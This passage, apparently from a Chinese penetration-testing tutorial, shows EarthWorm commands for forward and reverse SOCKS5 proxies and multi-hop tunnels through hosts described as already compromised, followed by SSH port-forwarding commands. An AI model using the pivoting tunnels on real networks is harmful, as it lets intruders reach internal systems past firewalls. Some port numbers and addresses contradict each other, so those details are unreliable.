```     
数据流向为   IE -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks  
#### 0x04.2.1 正向 SOCKS5 服务器
当目标网络边界存在公网 IP 且可任意开监听端口  
`ew_for_Win.exe -s ssocksd -l 8888`  
![](../pictures/port-forwarding-15.png)    
上述命令是在该机器（192.168.153.140）开启一个 8888 的正向连接端口。然后其它主机可通过设置代理为 192.168.153.140:8888 添加这个代理。这里使用的是 proxychains  
![](../pictures/port-forwarding-16.png)    
#### 0x04.2.2 反弹 SOCKS5 服务器
当目标网络边界不存在公网 IP，通过反弹方式创建 socks 代理。  
先在一台具有公网 ip 的主机 A 上运行以下命令  
`./ew_for_linux64 -s rcsocks -l 1080 -e 8888`  
![](../pictures/port-forwarding-17.png)   
意思是在我们公网 VPS 上添加一个转接隧道，把 1080 端口收到的代理请求转交给 8888 端口  
在目标主机 B 上启动 SOCKS5 服务 并反弹到公网主机的 8888 端口  
`ew_for_Win.exe -s rssocks -d 192.168.153.129 -e 8888`  
![](../pictures/port-forwarding-18.png)   
本地主机（192.168.153.129）然后通过添加公网 192.168.153.129:1080 这个代理, 来访问内网机器（192.168.153.129）
当然如果本地主机如果是公网 ip，就可以把在公网执行的步骤放在本地执行即可。  
![](../pictures/port-forwarding-19.png)   
#### 0x04.2.3 二级网络环境（一）
假设我们获得了右侧 A 主机和 B 主机的控制权限，A 主机配有 2 块网卡，一块 10.129.72.168 连通外网，一块 192.168.153.140 只能连接内网 B 主机，无法访问内网其它资源。B 主机可以访问内网资源，但无法访问外网。  
![](../pictures/port-forwarding-20.png)     
先上传 ew 到 B 主机，利用 ssocksd 方式启动 8888 端口的 SOCKS 代理，命令如下  
`ew_for_Win.exe -s ssocksd -l 8888`  
然后在 A 主机执行  
`ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888`  
![](../pictures/port-forwarding-21.png)    
含义是将 1080 端口收到的代理请求转交给 B 主机（192.168.153.138）的 8888 端口  
然后 My pc 就可以通过 A 的外网代理 10.129.72.168:1080 访问 B。  
![](../pictures/port-forwarding-22.png)     
#### 0x04.2.4 二级网络环境（二）
假设我们获得了右侧 A 主机和 B 主机的控制权限，A 主机没有公网 IP，也无法访问内网资源。B 主机可以访问内网资源，但无法访问外网。  
![](../pictures/port-forwarding-23.png)      
这次操作有四步。  
1. 在公网 vps（45.xxx.xxx.72）添加转接隧道，将 10800 端口收到的代理请求转交给 8888 端口  
`./ew_for_linux64 -s lcx_listen -l 10800 -e 8888`  
![](../pictures/port-forwarding-24.png)      
2. B（192.168.153.138）主机正向开启 8888 端口  
`ew_for_Win.exe -s ssocksd -l 9999`  
![](../pictures/port-forwarding-25.png)      
3. A 主机利用 lcx_slave 方式，将公网 VPS 的 888 端口和 B 主机的 999 端口连接起来  
`ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999`  
![](../pictures/port-forwarding-26.png)    
4. 现在 my pc 可通过访问 45.xxx.xxx.72:10800 来使用 192.168.153.138 主机提供的 socks5 代理，代理成功，vps 会有 rssocks cmd_socket OK! 提示  
![](../pictures/port-forwarding-27.png)      
![](../pictures/port-forwarding-28.png)      
## 0x05 ssh 隧道代理转发
ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。     
本地访问127.0.0.1:port1就是host:port2(用的更多)   
`ssh -CfNg -L port1:127.0.0.1:port2 user@host `   #本地转发   
访问host:port2就是访问127.0.0.1:port1   
`ssh -CfNg -R port2:127.0.0.1:port1 user@host`    #远程转发   
可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口   
`ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip`   #正向隧道
监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口   
`ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip`   #反向隧道  
用于内网穿透防火墙限制之类   
socket 代理: `ssh -qTfnN -D port remotehost`   
参数详解：   
-q Quiet mode. 安静模式   
-T Disable pseudo-tty allocation. 不占用 shell 了  
-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数 -N Do not execute a remote command. 不执行远程命令，端口转发就用它了   
`-L port:host:hostport`  将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口.   
IPv6 地址用另一种格式说明: `port/host/hostport -R port:host:hostport`  将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口.  
IPv6 地址用另一种格式说明: port/host/hostport -D port  指定一个本地机器 "动态的'' 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.  
### 0x05.1 ssh 本地转发
远程管理服务器上的 mysql，mysql 不能直接 root 远程登陆。这时候就可以通过本地转发，通过 ssh 将服务器的 3306 端口转发到本地 1234 端口  
`ssh -CfNg -L 1234 127.0.0.1:3306 PI:EMAIL`  
![](../pictures/port-forwarding-29.png)      
### 0x05.2 ssh 远程转发
内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。  
`ssh -CfNg -R 81:127.0.0.1:80 PI:EMAIL`  
![](../pictures/port-forwarding-30.png)      
![](../pictures/port-forwarding-31.png)    
现在在 192.168.153.142 访问 127.0.0.1:81 就是访问内网的服务器的 80 端口。  
### 0x05.3 ssh 动态转发 socks 代理 
把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接, 该连接就经过 ssh 隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。  
`ssh -qTfnN -D 1080  PI:EMAIL`  
![](../pictures/port-forwarding-32.png)      
![](../pictures/port-forwarding-33.png)